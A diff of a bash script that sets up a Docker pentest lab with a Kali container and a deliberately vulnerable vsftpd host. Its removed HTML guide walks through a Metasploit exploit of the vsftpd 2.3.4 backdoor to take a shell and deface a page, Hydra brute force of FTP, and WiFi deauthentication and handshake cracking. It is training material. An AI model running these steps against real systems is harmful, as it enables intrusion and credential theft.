@@ -1,561 +1,124 @@
-echo Deleting containers
-pkill -f "python3 -m http.server 8088"
-rm /tmp/index.html
-docker rm kali --force
-docker rm badweb --force
-docker network rm demo
-echo install
-docker network create demo
-echo Create Kali
-docker run -d --privileged=true --network demo -h attackmachine -it --rm --name kali kalilinux/kali-rolling
-echo Create Badweb
-docker run -d -h victimmachine --network demo -it --rm --name badweb asecurityguru/abccorpdockerapp:v1
-#after install
-echo Setup
-docker exec -it badweb sed -i 's/listen=NO/listen=YES/' /etc/vsftpd.conf
-docker exec -d badweb bash -c "vsftpd /etc/vsftpd.conf &"
-docker exec badweb sh -c "useradd -m -g admin admin -s /bin/bash && echo 'admin:aaabb' | chpasswd"
-docker exec badweb sh -c "echo '<html><head><title>Hello</title></head><body><h1>Hello World!</h1></body></html>' > /home/admin/index.html && chown admin:admin /home/admin/index.html"
-docker exec badweb sh -c "cd /home/admin && python -m SimpleHTTPServer 80" &
-docker exec -it kali apt-get update && docker exec -it kali apt-get install -y aircrack-ng && docker exec -it kali apt-get install -y metasploit-framework && docker exec -it kali apt-get install -y nmap && docker exec -it kali apt-get install -y hydra && docker exec -it kali apt-get install -y vim && docker exec -it kali apt-get install -y crunch && docker exec -it kali cd /usr/share/nmap/scripts/ && docker exec -it git clone https://github.com/vulnersCom/nmap-vulners.git && docker exec -it cd vulscan/utilities/updater/ && docker exec -it chmod +x updateFiles.sh && docker update -it ./updateFiles.sh 
+#!/bin/bash
 
-# --- Configuration ---
+# silence docker hints
+export DOCKER_CLI_HINTS=false
+
+# --- Constants ---
 KALI_CONTAINER="kali"
 BADWEB_CONTAINER="badweb"
 HTTP_PORT="8088"
 HTML_FILE="/tmp/index.html"
 
 # --- Functions ---
+
+cleanup_environment() {
+  echo "Cleaning up previous containers and network..."
+  pkill -f "python3 -m http.server $HTTP_PORT"
+  rm -f "$HTML_FILE"
+  docker rm "$KALI_CONTAINER" --force
+  docker rm "$BADWEB_CONTAINER" --force
+  docker network rm demo
+}
+
+setup_environment() {
+  echo "Setting up environment..."
+  docker network create demo
+
+  echo "Creating Kali container..."
+  docker run -d --privileged --network demo -h attackmachine -it --rm --name "$KALI_CONTAINER" kalilinux/kali-last-release
+
+  echo "Creating Badweb container..."
+  docker run -d -h victimmachine --network demo -it --rm --name "$BADWEB_CONTAINER" asecurityguru/abccorpdockerapp:v1
+}
+
+configure_badweb_services() {
+  echo "Configuring services on Badweb..."
+  docker exec "$BADWEB_CONTAINER" bash -c "
+    sed -i 's/listen=NO/listen=YES/' /etc/vsftpd.conf &&
+    vsftpd /etc/vsftpd.conf &
+    useradd -m -g admin admin -s /bin/bash &&
+    echo 'admin:aaabb' | chpasswd &&
+    echo '<html><head><title>Hello</title></head><body><h1>Hello World!</h1></body></html>' > /home/admin/index.html &&
+    chown admin:admin /home/admin/index.html &&
+    cd /home/admin &&
+    nohup python -m SimpleHTTPServer 80 &>/dev/null &
+  "
+}
+
+update_kali_and_install_tools() {
+  echo "Updating Kali and installing tools..."
+  docker exec -it "$KALI_CONTAINER" bash -c "
+    apt-get update &&
+    apt-get install -y ca-certificates &&
+    sed -i 's/http:/https:/' /etc/apt/sources.list &&
+    apt-get update &&
+    apt-get install -y aircrack-ng metasploit-framework nmap hydra vim crunch iputils-ping &&
+    cd /usr/share/nmap/scripts/ &&
+    git clone https://github.com/vulnersCom/nmap-vulners.git &&
+    cd vulscan/utilities/updater/ &&
+    chmod +x updateFiles.sh &&
+    ./updateFiles.sh
+  "
+}
+
 get_container_ip() {
   docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$1"
 }
 
-run_nmap() {
-  docker exec "$1" nmap -sV -p 21 "$2"
+run_nmap_scan() {
+  local attacker_container="$1"
+  local target_ip="$2"
+  echo "Running Nmap scan on $target_ip from $attacker_container..."
+  docker exec "$attacker_container" nmap -sV -p 21 "$target_ip"
 }
 
-create_html() {
+generate_html_report() {
   local kali_ip="$1"
   local badweb_ip="$2"
   local badweb_hostname="$3"
   local nmap_result="$4"
   local nmap_status="$5"
 
-  cat <<EOF > "$HTML_FILE"
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hack yourself into trouble</title>
-    <style>
-        body { font-family: sans-serif; margin: 20px; }
-        h1 { color: #336699; }
-        .status-section { margin-bottom: 20px; border: 1px solid #ddd; padding: 15px; border-radius: 5px; }
-        .pre-wrap { white-space: pre-wrap; background-color: #f4f4f4; padding: 10px; border-radius: 3px; }
-        .status-success { color: green; }
-        .status-failed { color: red; }
-    </style>
-</head>
-<center><h1>Hack yourself into trouble</h1></center>
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 300"> <defs>
-        <filter id="shadow" x="-10%" y="-10%" width="120%" height="120%"> <feDropShadow dx="2" dy="2" stdDeviation="2" flood-color="#888" flood-opacity="0.5"/>
-        </filter>
-        <linearGradient id="computerGradient" x1="0%" y1="0%" x2="100%" y2="100%">
-            <stop offset="0%" style="stop-color:#f0f0f0;stop-opacity:1"/>
-            <stop offset="100%" style="stop-color:#d0d0d0;stop-opacity:1"/>
-        </linearGradient>
-    </defs>
-
-    <rect width="600" height="300" fill="#fff"/> <g transform="translate(50, 80)" filter="url(#shadow)"> <rect width="150" height="90" rx="8" ry="8" fill="url(#computerGradient)"
-              stroke="#333"
-              stroke-width="1"/>
-
-        <text x="75" y="20"
-              text-anchor="middle"
-              font-weight="bold"
-              font-size="12">
-            Kali Linux
-        </text>
-
-        <text x="75" y="40"
-              text-anchor="middle"
-              font-size="10">
-            IP: $kali_ip
-        </text>
-
-        <text x="75" y="55"
-              text-anchor="middle"
-              font-size="10">
-            Tools: Metasploit, Nmap
-        </text>
-
-        <rect x="5" y="75" width="140" height="7"
-              fill="#4CAF50"
-              rx="3" ry="3"/>
-    </g>
-
-    <g transform="translate(350, 80)" filter="url(#shadow)"> <rect width="150" height="90" rx="8" ry="8" fill="url(#computerGradient)"
-              stroke="#333"
-              stroke-width="1"/>
-
-        <text x="75" y="20"
-              text-anchor="middle"
-              font-weight="bold"
-              font-size="12">
-            Vulnerable Machine
-        </text>
-
-        <text x="75" y="40"
-              text-anchor="middle"
-              font-size="10">
-            IP: $badweb_ip
-        </text>
-
-        <text x="75" y="55"
-              text-anchor="middle"
-              font-size="10">
-            Services: vsftpd, Web
-        </text>
-
-        <rect x="5" y="75" width="140" height="7"
-              fill="#FF5722"
-              rx="3" ry="3"/>
-    </g>
-
-    <path d="M200,125 Q300,95 350,125"
-          fill="none"
-          stroke="#2196F3"
-          stroke-width="2"
-          stroke-dasharray="3,3"/>
-
-    <text x="275" y="90"
-          text-anchor="middle"
-          font-size="10"
-          fill="#2196F3">
-        Network: 
-    </text>
-</svg>
-<body>
-
-    <div class="status-section">
-        <h2>Container Information</h2>
-        <p><strong>Kali IP:</strong> $kali_ip</p>
-        <p><strong>BadWeb IP:</strong> <a href="http://$badweb_ip" target="_blank">$badweb_ip</a></p>
-        <p><strong>BadWeb Hostname:</strong> $badweb_hostname</p>
-    </div>
-
-    <div class="status-section">
-        <h2>Nmap Scan Results</h2>
-        <pre class="pre-wrap">$nmap_result</pre>
-    </div>
-<p>For more information about vsftpd 2.3.4, please visit:<a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523" target="_blank">vsftpd 2.3.4</a>
-<hr>
-
-
-<center><h1>Exploiting CVE-2011-2523 with Metasploit</h1></center>
-
-<p>This guide demonstrates how to exploit CVE-2011-2523, a backdoor vulnerability in VSFTPd 2.3.4, using Metasploit. The attacking machine is named "kali $kali_ip ," and the vulnerable machine is named "badweb $badweb_ip."</p>
-
-<h2>Understanding CVE-2011-2523</h2>
-
-<p>CVE-2011-2523 is a backdoor vulnerability that was intentionally introduced into VSFTPd 2.3.4. When a username ending with ":)" is used, the backdoor opens a listening shell on port 6200 of the vulnerable server. This allows remote attackers to execute arbitrary commands.</p>
-
-<h2>Step-by-Step Guide</h2>
-
-<ol>
-  <li>
-    <strong>Conect to the kali machine:</strong>
-    <p>Open a terminal</p>
-    <p> run this command 
-    <pre><code>docker exec -it kali bash</code></pre>
-  </li>
-  <li>
-    <strong>Start Metasploit on "kali":</strong>
-    <p>Open a terminal on "kali" and start the Metasploit Framework:</p>
-    <pre><code>msfconsole</code></pre>
-  </li>
-  <li>
-    <strong>Search for the Exploit:</strong>
-    <p>In the Metasploit console, search for the VSFTPd backdoor exploit:</p>
-    <pre><code>search vsftpd</code></pre>
-  </li>
-  <li>
-    <strong>Use the Exploit Module:</strong>
-    <p>Select the exploit module:</p>
-    <pre><code>use exploit/unix/ftp/vsftpd_234_backdoor</code></pre>
-  </li>
-  <li>
-    <strong>Set the Remote Host (RHOSTS):</strong>
-    <p>Set the IP address or hostname of the "badweb" machine:</p>
-    <pre><code>set RHOSTS $badweb_ip</code></pre>
-  </li>
-  <li>
-    <strong>Run the Exploit:</strong>
-    <p>Execute the exploit:</p>
-    <pre><code>exploit</code></pre>
-  </li>
-  <li>
-    <strong>Interact with the Shell:</strong>
-    <p>If the exploit is successful, you will gain a shell on the "badweb" machine. You can now execute commands:</p>
-    <pre><code>whoami</code></pre>
-    <p>or</p>
-    <pre><code>ls -l</code></pre>
-  </li>
-
-<li>
-    <strong>Change the webpage:</strong>
-    <p>The default weppage for $badweb_ip is index.html in /home/admin , lets read it then lets change it:</p>
-    <p>change to the correct directory on the badweb machine</p>
-    <pre><code>cd /home/admin</code></pre>
-    <p>List all the files in the directory</p>
-    <pre><code>ls</code></pre>
-    <p>Read the contents of the file index.html</p>
-    <pre><code>cat index.html</code></pre>
-    <p><strong>Verify the website content</strong> <a href="http://$badweb_ip" target="_blank">$badweb_ip</a></p>
-    <p>Replace the text in the file with the word byebye</p>
-    <pre><code>echo byebye > index.html</code></pre>
-    <p>Read the contents of the file index.html, anything diffrent</p>
-    <pre><code>cat index.html</code></pre>
-    <p><strong>Verify the website content changes</strong> <a href="http://$badweb_ip" target="_blank">$badweb_ip</a></p>
-  </li>
-
-  <li>
-    <strong>Explanation of the exploit:</strong>
-    <p>The exploit sends a specially crafted ftp login request. The username ends in ":)". This causes the vulnerable vsftpd server to open a listening shell on port 6200. Metasploit then connects to this port, and provides an interactive shell.</p>
-  </li>
-</ol>
-
-<h2>Important Notes</h2>
-
-<ul>
-  <li>This exploit only works on VSFTPd version 2.3.4.</li>
-  <li>This demonstration is for educational purposes only. Do not use these techniques against systems without explicit permission.</li>
-</ul>
-
-</body>
-</html>
-<hr>
-____
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Brute Force Password Attacks with Crunch and Hydra</title>
-    <style>
-        body { font-family: sans-serif; margin: 20px; }
-        h1 { color: #336699; }
-        .status-section { margin-bottom: 20px; border: 1px solid #ddd; padding: 15px; border-radius: 5px; }
-        .pre-wrap { white-space: pre-wrap; background-color: #f4f4f4; padding: 10px; border-radius: 3px; }
-        .status-success { color: green; }
-        .status-failed { color: red; }
-    </style>
-</head>
-<body>
-   <center><h1>Brute Force Password Attacks with Crunch and Hydra</h1></center>
-
-    <p>This guide demonstrates how to use Crunch for wordlist generation and Hydra for brute-force password attacks. The attacking machine is Kali Linux and the target is a vulnerable FTP server.</p>
-
-    <h2>Understanding Password Cracking Tools</h2>
-
-    <p><strong>Crunch</strong> is a wordlist generator that creates customized dictionaries based on specific patterns and character sets. It's useful for targeted brute force attacks when you have some information about the password structure.</p>
-
-    <p><strong>Hydra</strong> is a fast and flexible online password cracking tool that supports numerous protocols. It's designed to perform rapid dictionary attacks against various network services.</p>
-
-    <h2>Step-by-Step Guide</h2>
-
-    <ol>
-      <li>
-        <strong>Connect to the Kali machine:</strong>
-        <p>Open a terminal</p>
-        <p>Run this command:</p>
-        <pre><code>docker exec -it kali bash</code></pre>
-      </li>
-      <li>
-        <strong>Generate a wordlist using Crunch:</strong>
-        <p>Crunch can generate all possible combinations of a character set with defined length parameters.</p>
-        <pre><code>crunch 5 5 abcdefghijklmnopqrstuvwxyz -o 5letter.txt</code></pre>
-        <p>This command creates a wordlist containing:</p>
-        <ul>
-          <li>All 5-character passwords (<code>5 5</code> parameters)</li>
-          <li>Using only lowercase letters (<code>abcdefghijklmnopqrstuvwxyz</code>)</li>
-          <li>Saving the output to a file named <code>5letter.txt</code></li>
-        </ul>
-      </li>
-      <li>
-        <strong>Examine the wordlist:</strong>
-        <p>Check the wordlist file and its size:</p>
-        <pre><code>ls -lh 5letter.txt
-head -n 10 5letter.txt
-wc -l 5letter.txt</code></pre>
-      </li>
-      <li>
-        <strong>Perform a brute force attack with Hydra:</strong>
-        <p>Use Hydra to attempt login to the FTP server with the generated wordlist:</p>
-        <pre><code>hydra -l admin -P 5letter.txt ftp://${badweb_ip}</code></pre>
-        <p>Where:</p>
-        <ul>
-          <li><code>-l admin</code> specifies the username to try (we know it's "admin")</li>
-          <li><code>-P 5letter.txt</code> specifies the wordlist file to use</li>
-          <li><code>ftp://${badweb_ip}</code> is the target FTP service</li>
-        </ul>
-      </li>
-      <li>
-        <strong>Wait for results:</strong>
-        <p>Hydra will attempt each password in the wordlist until it finds a match or exhausts all possibilities. This may take some time depending on the size of the wordlist.</p>
-      </li>
-      <li>
-        <strong>Successful login:</strong>
-        <p>When Hydra finds the correct password, it will display output similar to:</p>
-        <pre><code>[21][ftp] host: ${badweb_ip}   login: admin   password: password123</code></pre>
-      </li>
-      <li>
-        <strong>Connect to the FTP server:</strong>
-        <p>Verify the credentials by connecting to the FTP server:</p>
-        <pre><code>ftp ${badweb_ip}</code></pre>
-        <p>When prompted, enter:</p>
-        <ul>
-          <li>Username: <code>admin</code></li>
-          <li>Password: <code>password123</code> (or whatever password Hydra discovered)</li>
-        </ul>
-      </li>
-      <li>
-        <strong>Navigate the FTP server:</strong>
-        <p>Once connected, you can list directories and download files:</p>
-        <pre><code>ls
-get index.html
-exit</code></pre>
-      </li>
-    </ol>
-
-    <h2>Advanced Crunch Usage</h2>
-
-    <div class="status-section">
-      <h3>Custom Character Sets</h3>
-      <pre><code>crunch 8 8 ABC123!@# -o custom.txt</code></pre>
-      <p>This generates 8-character passwords using only uppercase letters, numbers 1-3, and specific symbols.</p>
-    </div>
-
-    <div class="status-section">
-      <h3>Pattern-Based Generation</h3>
-      <pre><code>crunch 8 8 -t pass%%%% -o pattern.txt</code></pre>
-      <p>This creates passwords that start with "pass" followed by 4 digits.</p>
-    </div>
-
-    <div class="status-section">
-      <h3>Limiting Output Size</h3>
-      <pre><code>crunch 6 6 0123456789 -s 900000 -e 950000 -o chunk.txt</code></pre>
-      <p>This generates 6-digit passwords starting from 900000 and ending at 950000.</p>
-    </div>
-
-    <h2>Advanced Hydra Usage</h2>
-
-    <div class="status-section">
-      <h3>Multiple Usernames</h3>
-      <pre><code>hydra -L users.txt -P passwords.txt ftp://${badweb_ip}</code></pre>
-      <p>Tests all combinations of usernames from users.txt and passwords from passwords.txt.</p>
-    </div>
-
-    <div class="status-section">
-      <h3>Throttling Requests</h3>
-      <pre><code>hydra -l admin -P wordlist.txt -t 4 ftp://${badweb_ip}</code></pre>
-      <p>Limits to 4 parallel connections to avoid detection.</p>
-    </div>
-
-    <div class="status-section">
-      <h3>Verbose Output</h3>
-      <pre><code>hydra -l admin -P wordlist.txt -V ftp://${badweb_ip}</code></pre>
-      <p>Shows each attempt in real-time.</p>
-    </div>
-
-    <h2>Important Notes</h2>
-
-    <ul>
-      <li>Password attacks should only be performed against systems you own or have explicit permission to test.</li>
-      <li>Brute force attacks are resource-intensive and may be detected by intrusion detection systems.</li>
-      <li>Many systems implement account lockout policies after multiple failed attempts.</li>
-      <li>These techniques are demonstrated for educational purposes to understand security vulnerabilities.</li>
-    </ul>
-</body>
-</html>
-____
-<center><h1>WiFi Hacking: Wireless Network Vulnerabilities</h1>
-<body>
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 300"> <defs>
-        <filter id="shadow" x="-10%" y="-10%" width="120%" height="120%"> <feDropShadow dx="2" dy="2" stdDeviation="2" flood-color="#888" flood-opacity="0.5"/>
-        </filter>
-        <linearGradient id="computerGradient" x1="0%" y1="0%" x2="100%" y2="100%">
-            <stop offset="0%" style="stop-color:#f0f0f0;stop-opacity:1"/>
-            <stop offset="100%" style="stop-color:#d0d0d0;stop-opacity:1"/>
-        </linearGradient>
-    </defs>
-
-    <rect width="600" height="300" fill="#fff"/> <g transform="translate(50, 80)" filter="url(#shadow)"> <rect width="150" height="90" rx="8" ry="8" fill="url(#computerGradient)"
-              stroke="#333"
-              stroke-width="1"/>
-
-        <text x="75" y="20"
-              text-anchor="middle"
-              font-weight="bold"
-              font-size="12">
-            Kali Linux
-        </text>
-
-        <text x="75" y="40"
-              text-anchor="middle"
-              font-size="10">
-            Wifi: wlan0
-        </text>
-
-        <text x="75" y="55"
-              text-anchor="middle"
-              font-size="10">
-            Tools: airmon-ng, hashcat , Nmap
-        </text>
-
-        <rect x="5" y="75" width="140" height="7"
-              fill="#4CAF50"
-              rx="3" ry="3"/>
-    </g>
-
-    <g transform="translate(350, 80)" filter="url(#shadow)"> <rect width="150" height="90" rx="8" ry="8" fill="url(#computerGradient)"
-              stroke="#333"
-              stroke-width="1"/>
-
-        <text x="75" y="20"
-              text-anchor="middle"
-              font-weight="bold"
-              font-size="12">
-            Wifi Access Point
-        </text>
-
-        <text x="75" y="40"
-              text-anchor="middle"
-              font-size="10">
-            Wifi: Wifi-1
-        </text>
-
-        <text x="75" y="55"
-              text-anchor="middle"
-              font-size="10">
-            
-        </text>
-
-        <rect x="5" y="75" width="140" height="7"
-              fill="#FF5722"
-              rx="3" ry="3"/>
-    </g>
-
-    <path d="M200,125 Q300,95 350,125"
-          fill="none"
-          stroke="#2196F3"
-          stroke-width="2"
-          stroke-dasharray="3,3"/>
-
-    <text x="275" y="90"
-          text-anchor="middle"
-          font-size="10"
-          fill="#2196F3">
-    </text>
-</svg>
-
-</center>
-    <p>This lab demonstrates the risks of weak WiFi passwords and the techniques used to compromise wireless networks. The attacking machine is Kali Linux, and the target is a vulnerable WiFi network with a weak password.</p>
-
-    <h2>Understanding WiFi Security Vulnerabilities</h2>
-
-    <p>Wireless networks are particularly vulnerable to attacks due to their broadcast nature. Weak passwords can be cracked using various techniques, including:</p>
-    <ul>
-        <li><strong>Brute Force Attacks:</strong> Systematically trying all possible password combinations</li>
-        <li><strong>Dictionary Attacks:</strong> Using pre-compiled lists of common passwords</li>
-        <li><strong>Handshake Capture:</strong> Intercepting the authentication process to crack passwords offline</li>
-    </ul>
-
-    <h2>Lab Setup and Tools</h2>
-
-    <div class="status-section">
-        <h3>Required Tools</h3>
-        <ul>
-            <li><strong>Aircrack-ng Suite:</strong> Comprehensive WiFi cracking toolkit</li>
-            <li><strong>Wireshark:</strong> Network protocol analyzer</li>
-            <li><strong>Hashcat:</strong> Advanced password recovery tool</li>
-        </ul>
-    </div>
-
-    <h2>Step-by-Step WiFi Hacking Demonstration</h2>
-
-    <ol>
-        <li>
-            <strong>Prepare the Kali Linux Environment:</strong>
-            <p>Connect to the Kali machine:</p>
-            <pre class="pre-wrap"><code>docker exec -it kali bash</code></pre>
-        </li>
-
-        <li>
-            <strong>WiFi Network Reconnaissance:</strong>
-            <p>Scan for available WiFi networks:</p>
-            <pre class="pre-wrap"><code>airmon-ng</code></pre>
-            <p>Put wireless interface into monitor mode:</p>
-            <pre class="pre-wrap"><code>airmon-ng start wlan0</code></pre>
-            <p>Scan for networks:</p>
-            <pre class="pre-wrap"><code>airodump-ng wlan0mon</code></pre>
-        </li>
-
-        <li>
-            <strong>Capture WiFi Handshake:</strong>
-            <p>Target a specific network and capture the authentication handshake:</p>
-            <pre class="pre-wrap"><code>airodump-ng -c [CHANNEL] --bssid [MAC_ADDRESS] -w capture wlan0mon</code></pre>
-            <p>Deauthenticate a connected client to force re-authentication:</p>
-            <pre class="pre-wrap"><code>aireplay-ng -0 1 -a [ROUTER_MAC] -c [CLIENT_MAC] wlan0mon</code></pre>
-        </li>
-
-        <li>
-            <strong>Crack the Password:</strong>
-            <p>Use aircrack-ng with a wordlist:</p>
-            <pre class="pre-wrap"><code>aircrack-ng -w wordlist.txt capture-01.cap</code></pre>
-            <p>Or use hashcat for more advanced cracking:</p>
-            <pre class="pre-wrap"><code>hashcat -m 2500 capture-01.handshake /path/to/wordlist.txt</code></pre>
-        </li>
-    </ol>
-
-    <h2>Password Cracking Techniques</h2>
-
-    <div class="status-section">
-        <h3>Wordlist Generation</h3>
-        <p>Create custom wordlists using Crunch:</p>
-        <pre class="pre-wrap"><code>crunch 8 12 0123456789ABCDEF -o wifi-passwords.txt</code></pre>
-        <p>This generates passwords between 8-12 characters using hexadecimal characters.</p>
-    </div>
-
-    <div class="status-
-
-</body>
-</html>
-EOF
-
-
+  echo "Generating HTML report..."
+  template=$(<template.html)
+
+  # Replace placeholders in template
+  populated_template=${template//\$kali_ip/$kali_ip}
+  populated_template=${populated_template//\$badweb_ip/$badweb_ip}
+  populated_template=${populated_template//\$badweb_hostname/$badweb_hostname}
+  populated_template=${populated_template//\$nmap_result/$nmap_result}
+  populated_template=${populated_template//\$nmap_status/$nmap_status}
+
+  # Write populated HTML to file
+  echo "$populated_template" > "$HTML_FILE"
 }
 
 start_http_server() {
-  clear
-  echo "Starting simple HTTP server on port $HTTP_PORT..."
+  echo "Starting HTTP server on port $HTTP_PORT..."
   python3 -m http.server "$HTTP_PORT" -d /tmp/ &
-  echo "Open http://127.0.0.1:$HTTP_PORT in your browser."
-  wait
+  echo "HTTP server running. Open http://127.0.0.1:$HTTP_PORT in your browser."
 }
 
-# --- Main Script ---
+main() {
+  # --- Cleanup and Setup ---
+  cleanup_environment
+  setup_environment
+  configure_badweb_services
+  update_kali_and_install_tools
 
-# Get container IPs and hostname
-kali_ip=$(get_container_ip "$KALI_CONTAINER")
-badweb_ip=$(get_container_ip "$BADWEB_CONTAINER")
-badweb_hostname=$(docker exec "$BADWEB_CONTAINER" hostname)
+  # --- Gather Information ---
+  local kali_ip=$(get_container_ip "$KALI_CONTAINER")
+  local badweb_ip=$(get_container_ip "$BADWEB_CONTAINER")
+  local badweb_hostname="victimmachine"
 
-# Run nmap scan
-nmap_result=$(run_nmap "$KALI_CONTAINER" "$badweb_ip")
-nmap_status=$?
+  # --- Perform Actions ---
+  local nmap_result=$(run_nmap_scan "$KALI_CONTAINER" "$badweb_ip")
+  local nmap_status=$([[ $? -eq 0 ]] && echo "success" || echo "failed")
 
-# Create HTML report
-create_html "$kali_ip" "$badweb_ip" "$badweb_hostname" "$nmap_result" "$nmap_status"
+  # --- Generate Report and Serve ---
+  generate_html_report "$kali_ip" "$badweb_ip" "$badweb_hostname" "$nmap_result" "$nmap_status"
+  start_http_server
+}
 
-# Start HTTP server
-start_http_server &
+# Run the main function
+main
